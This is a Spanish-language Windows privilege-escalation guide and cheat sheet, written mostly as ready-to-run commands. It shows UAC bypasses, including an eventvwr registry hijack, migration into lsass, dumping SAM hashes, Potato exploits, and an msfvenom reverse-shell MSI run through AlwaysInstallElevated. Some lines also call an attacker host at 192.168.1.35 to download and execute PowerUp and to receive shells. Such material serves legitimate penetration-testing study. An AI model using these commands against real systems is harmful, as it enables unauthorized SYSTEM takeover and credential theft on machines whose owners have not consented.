# Escalada de Privilegios en Windows — Guía Completa

> La escalada de privilegios es el proceso de obtener un nivel de acceso mayor al que se tiene inicialmente. En Windows el objetivo habitual es pasar de usuario estándar a **NT AUTHORITY\SYSTEM**, el nivel máximo.

---

## Tabla de contenidos

1. [Conceptos clave](#1-conceptos-clave)
2. [Verificación inicial de privilegios](#2-verificación-inicial-de-privilegios)
3. [UAC — User Account Control](#3-uac--user-account-control)
4. [getsystem de Meterpreter](#4-getsystem-de-meterpreter)
5. [Privilegios de Windows explotables](#5-privilegios-de-windows-explotables)
6. [Potato Attacks](#6-potato-attacks)
7. [Escalada mediante configuraciones débiles](#7-escalada-mediante-configuraciones-débiles)
8. [Herramientas de enumeración automática](#8-herramientas-de-enumeración-automática)
9. [Cheat Sheet](#9-cheat-sheet)

---

## 1. Conceptos clave

### Tipos de escalada

| Tipo | Descripción | Ejemplo |
|------|-------------|---------|
| **Vertical** | Subir de nivel de privilegios | Usuario → Administrador → SYSTEM |
| **Horizontal** | Moverse a otro usuario del mismo nivel | Usuario A → Usuario B |

### Niveles de integridad en Windows

Windows usa un sistema de etiquetas de integridad para controlar qué puede hacer cada proceso:

```
Niveles de integridad (de menor a mayor):
─────────────────────────────────────────
Untrusted      → Procesos sin confianza (sandboxes de navegadores)
Low            → Internet Explorer en modo protegido
Medium         → Procesos de usuario estándar (el nivel por defecto)
High           → Procesos de administrador (elevados con UAC)
System         → Servicios del sistema operativo
Trusted Installer → Solo el instalador de Windows
```

**El objetivo:** pasar de **Medium** (usuario) a **High** (admin) o **System**.

### Tokens de acceso

Cada proceso en Windows tiene un **token de acceso** que contiene:
- La cuenta de usuario que lo creó
- Los grupos a los que pertenece
- Los privilegios habilitados

```powershell
# Ver el token del proceso actual desde PowerShell
whoami /all
```

---

## 2. Verificación inicial de privilegios

Antes de intentar escalar, hay que saber exactamente qué tenemos.

### Desde una shell de Windows

```powershell
# Usuario actual
whoami

# Todos los detalles: usuario, grupos y privilegios
whoami /all

# Solo los privilegios
whoami /priv

# Grupos del usuario
whoami /groups

# Información del sistema (para buscar exploits de kernel)
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Desde Meterpreter

```bash
meterpreter > getuid              # Usuario actual
meterpreter > getprivs            # Privilegios habilitados
meterpreter > getsid              # SID del usuario
meterpreter > ps                  # Procesos y sus usuarios

# Módulo de enumeración de usuarios activos
meterpreter > run post/windows/gather/enum_logged_on_users
```

### ¿Qué buscar en `whoami /priv`?

```
Privilegio              → ¿Para qué sirve al atacante?
──────────────────────────────────────────────────────
SeImpersonatePrivilege  → Potato attacks (escalar a SYSTEM)
SeDebugPrivilege        → Inyectar en procesos de SYSTEM
SeBackupPrivilege       → Leer cualquier archivo del sistema
SeRestorePrivilege      → Escribir en cualquier ruta
SeLoadDriverPrivilege   → Cargar drivers maliciosos
SeTakeOwnershipPrivilege→ Tomar propiedad de cualquier objeto
SeAssignPrimaryToken    → Crear procesos con tokens de otros usuarios
```

---

## 3. UAC — User Account Control

### ¿Qué es UAC?

El **Control de Cuentas de Usuario** es el mecanismo de Windows que pide confirmación antes de ejecutar acciones que requieren privilegios de administrador. Es la ventana emergente de "¿Deseas permitir que esta aplicación haga cambios?".

Incluso un usuario administrador corre normalmente con token de integridad **Medium**. Solo cuando el UAC aprueba una acción sube a **High**.

### Niveles de UAC

```
Siempre notificar          → Más seguro. Prompt para todo.
Notificar cambios en apps  → (Por defecto) Prompt solo para apps externas.
Notificar sin atenuar      → Prompt sin oscurecer la pantalla.
No notificar nunca         → UAC desactivado. Sin protección.
```

### Bypass de UAC con Metasploit

Estos módulos funcionan cuando ya tienes una sesión como usuario **administrador local** pero con token de integridad Medium, y necesitas elevarlo a High sin que el UAC muestre ningún prompt.

```bash
# Desde Meterpreter (sesión con usuario admin, integridad Medium)
# Primero: poner la sesión en background
meterpreter > background

# Ver la sesión
msf > sessions -l

# ── Técnica 1: fodhelper.exe ──────────────────────────────────
# Usa el binario legítimo fodhelper.exe (firmado por Microsoft)
# para ejecutar código con integridad High
msf > use exploit/windows/local/bypassuac_fodhelper
msf > set SESSION 1
msf > set LHOST 192.168.1.35
msf > run
# Resultado: nueva sesión Meterpreter con integridad High

# ── Técnica 2: bypassuac_dotnet ──────────────────────────────
msf > use exploit/windows/local/bypassuac_dotnet_profiler
msf > set SESSION 1
msf > run

# ── Técnica 3: Inyección en proceso ──────────────────────────
msf > use exploit/windows/local/bypassuac_injection
msf > set SESSION 1
msf > run

# ── Técnica 4: eventvwr (manual, sin Metasploit) ─────────────
# Aprovecha que eventvwr.exe busca una clave de registro modificable
# Desde una shell cmd con permisos de usuario admin:
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe
# Se abre cmd con integridad High
# Limpiar después:
reg delete "HKCU\Software\Classes\mscfile" /f
```

> **Importante:** Los bypass de UAC requieren que el usuario ya sea **administrador local**. Si el usuario es estándar, primero hay que escalar a admin por otro medio.

---

## 4. getsystem de Meterpreter

El comando `getsystem` de Meterpreter intenta múltiples técnicas automáticamente para obtener privilegios de **NT AUTHORITY\SYSTEM**.

```bash
meterpreter > getsystem
```

### Técnicas que usa `getsystem` internamente

| Técnica | Descripción |
|---------|-------------|
| **1. Named Pipe Impersonation (In Memory/Admin)** | Crea un named pipe y espera que un proceso SYSTEM se conecte para robar su token |
| **2. Named Pipe Impersonation (Dropper/Admin)** | Como la anterior pero escribe un servicio en disco temporalmente |
| **3. Token Duplication (In Memory/Admin)** | Duplica el token de un proceso SYSTEM existente usando SeDebugPrivilege |
| **4. Named Pipe Impersonation (RPCSS)** | Variante que apunta al servicio RPCSS |

```bash
# Si funciona:
meterpreter > getsystem
... got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# Si falla (protecciones activas):
meterpreter > getsystem
... ERROR: Operation failed: Access is denied.
# → Intentar bypass de UAC primero o buscar otros vectores
```

### Flujo recomendado

```
1. getprivs → ¿Tengo SeImpersonatePrivilege?
   │
   ├── SÍ → getsystem (probablemente funcione)
   │         └── Si falla → Potato attacks
   │
   └── NO → Tengo usuario estándar
             └── Buscar: UAC bypass, CVEs locales, misconfiguraciones
```

---

## 5. Privilegios de Windows explotables

### SeImpersonatePrivilege

El privilegio más explotado. Permite que un proceso suplante la identidad del cliente de una conexión.

**¿Quién lo tiene por defecto?**
- Cuentas de servicio (IIS, SQL Server, etc.)
- NT SERVICE\*

**¿Por qué es tan importante?**
Si tenemos este privilegio, podemos usar los **Potato Attacks** para escalar a SYSTEM.

```powershell
# Verificar
whoami /priv | findstr "SeImpersonate"
```

---

### SeDebugPrivilege

Permite depurar y modificar procesos de cualquier usuario, incluyendo SYSTEM.

**Explotación:**
```bash
# Desde Meterpreter: migrar al proceso lsass.exe (corre como SYSTEM)
meterpreter > ps | grep lsass
meterpreter > migrate <PID_lsass>
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

> **⚠️ Cuidado:** `lsass.exe` es crítico para el sistema. Si el proceso crashea, el sistema se reinicia.

---

### SeBackupPrivilege y SeRestorePrivilege

Permiten leer y escribir cualquier archivo del sistema, ignorando los permisos de archivo.

```powershell
# Desde PowerShell: leer SAM (hashes de contraseñas locales)
# El SAM normalmente está bloqueado, pero con SeBackupPrivilege se puede copiar
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system

# Luego en Kali, extraer hashes con impacket
impacket-secretsdump -sam sam -system system LOCAL
```

---

## 6. Potato Attacks

Los "Potato" son una familia de exploits que aprovechan `SeImpersonatePrivilege` para escalar a SYSTEM. Se llaman así porque el primero se llamó "Rotten Potato".

### PrintSpoofer (Windows 10 / Server 2019)

El más moderno y efectivo en sistemas actuales.

```bash
# Descargar PrintSpoofer en Kali y subir al objetivo
meterpreter > upload /root/PrintSpoofer64.exe C:\\Windows\\Temp\\

# Ejecutar desde shell del sistema
meterpreter > shell
C:\> C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd
# Abre una cmd como NT AUTHORITY\SYSTEM

# URL: https://github.com/itm4n/PrintSpoofer
```

### JuicyPotato (Windows 7-10, Server 2008-2019)

Funciona en versiones antiguas pero no en Windows 10 1809+ ni Server 2019.

```bash
meterpreter > upload /root/JuicyPotato.exe C:\\Windows\\Temp\\
meterpreter > shell
C:\> JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
# El CLSID depende del sistema operativo objetivo
# Lista: https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

### RoguePotato (Server 2019 / Windows 10 1809+)

Para los sistemas donde JuicyPotato ya no funciona.

```bash
# Requiere dos archivos: RoguePotato.exe y RogueOxidResolver.exe
meterpreter > upload /root/RoguePotato.exe C:\\Windows\\Temp\\
meterpreter > shell
C:\> RoguePotato.exe -r 192.168.1.35 -e "cmd.exe" -l 9999
```

### Resumen de compatibilidad

| Herramienta | Win 7-8 | Win 10 pre-1809 | Win 10 1809+ | Server 2019+ |
|-------------|---------|-----------------|--------------|--------------|
| JuicyPotato | ✅ | ✅ | ❌ | ❌ |
| RoguePotato | ❌ | ❌ | ✅ | ✅ |
| PrintSpoofer | ❌ | ❌ | ✅ | ✅ |

---

## 7. Escalada mediante configuraciones débiles

### Unquoted Service Path

Cuando la ruta de un servicio contiene espacios y no está entre comillas, Windows busca el ejecutable en varias ubicaciones intermedias.

```
Ruta vulnerable:
C:\Program Files\My App\service.exe

Windows busca en orden:
1. C:\Program.exe          ← Si existe, Windows lo ejecuta como SYSTEM
2. C:\Program Files\My.exe
3. C:\Program Files\My App\service.exe (la correcta)
```

```powershell
# Detectar servicios con rutas sin comillas
wmic service get name,displayname,pathname,startmode |
  findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v '\"'

# Si encontramos una ruta vulnerable como C:\Program Files\Vuln App\service.exe
# y tenemos permisos de escritura en C:\Program Files\
# crear C:\Program Files\Vuln.exe con nuestro payload
```

---

### AlwaysInstallElevated

Si estas dos claves del registro están a 1, cualquier instalación `.msi` se ejecuta como SYSTEM.

```powershell
# Verificar (ambas deben ser 1 para ser vulnerable)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generar un .msi malicioso y ejecutarlo como usuario normal
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.35 LPORT=4444 \
         -f msi \
         -o elevate.msi
msiexec /quiet /qn /i elevate.msi   # Se ejecuta como SYSTEM
```

---

### Weak Service Permissions

Si un usuario puede modificar la ruta del ejecutable de un servicio, puede reemplazarlo por un payload.

```powershell
# Enumerar permisos de servicios con PowerUp.ps1
. .\PowerUp.ps1
Invoke-AllChecks

# O con sc.exe para un servicio específico
sc qc NombreServicio
sc sdshow NombreServicio   # Ver DACL del servicio
```

---

## 8. Herramientas de enumeración automática

### WinPEAS (recomendada)

La herramienta más completa para enumerar vectores de escalada en Windows.

```bash
# Descargar en Kali
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe

# Subir al objetivo
meterpreter > upload /root/winPEASx64.exe C:\\Windows\\Temp\\

# Ejecutar y guardar output
meterpreter > shell
C:\> C:\Windows\Temp\winPEASx64.exe > C:\Windows\Temp\wpeas_out.txt

# Descargar resultado
meterpreter > download C:\\Windows\\Temp\\wpeas_out.txt /root/
```

WinPEAS comprueba automáticamente:
- Servicios con configuraciones débiles
- AlwaysInstallElevated
- Credenciales en el registro y archivos de configuración
- Tareas programadas modificables
- Drivers desactualizados
- Vectores de DLL Hijacking

---

### PowerUp.ps1

Script PowerShell de PowerSploit enfocado en escalada de privilegios.

```powershell
# En el objetivo (con PowerShell)
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.35/PowerUp.ps1')
Invoke-AllChecks
```

---

### Local Exploit Suggester (Metasploit)

Módulo de Metasploit que compara los parches instalados con exploits locales conocidos.

```bash
# Desde una sesión Meterpreter activa
meterpreter > run post/multi/recon/local_exploit_suggester

# Puede tardar varios minutos
# Resultado: lista de módulos de Metasploit que podrían funcionar
```

---

## 9. Cheat Sheet

```
══════════════════════════════════════════════════════════════
         ESCALADA DE PRIVILEGIOS WINDOWS — CHEAT SHEET
══════════════════════════════════════════════════════════════

VERIFICACIÓN INICIAL
  whoami                     Usuario actual
  whoami /priv               Privilegios del proceso
  whoami /groups             Grupos del usuario
  whoami /all                Todo junto
  systeminfo                 Info del sistema para CVEs de kernel

METERPRETER
  getuid / getprivs          Verificar sesión actual
  getsystem                  Escalar automáticamente (prueba varias técnicas)
  run post/multi/recon/local_exploit_suggester    Buscar exploits locales

UAC BYPASS (Metasploit)
  exploit/windows/local/bypassuac_fodhelper       Más fiable en Win 10/11
  exploit/windows/local/bypassuac_dotnet_profiler
  exploit/windows/local/bypassuac_injection

POTATO ATTACKS (necesitan SeImpersonatePrivilege)
  PrintSpoofer64.exe -i -c cmd       Win 10 1809+ / Server 2019+
  JuicyPotato.exe -l PORT -p cmd.exe Win 7/8/10 pre-1809
  RoguePotato.exe -r LHOST           Win 10 1809+ / Server 2019+

CONFIGURACIONES DÉBILES
  AlwaysInstallElevated:
    reg query HKLM\...\Installer /v AlwaysInstallElevated
    msfvenom ... -f msi -o payload.msi → msiexec /quiet /i payload.msi

  Unquoted Service Path:
    wmic service get pathname | findstr /i /v '\"' | findstr /i /v "C:\Windows"

HERRAMIENTAS AUTOMÁTICAS
  winPEASx64.exe > output.txt        Enumeración completa
  Invoke-AllChecks (PowerUp.ps1)     Escalada automatizada

══════════════════════════════════════════════════════════════
```

---

## Referencias

- [HackTricks — Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings — Windows Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [MITRE ATT&CK — Privilege Escalation (TA0004)](https://attack.mitre.org/tactics/TA0004/)
- [PrintSpoofer — itm4n](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
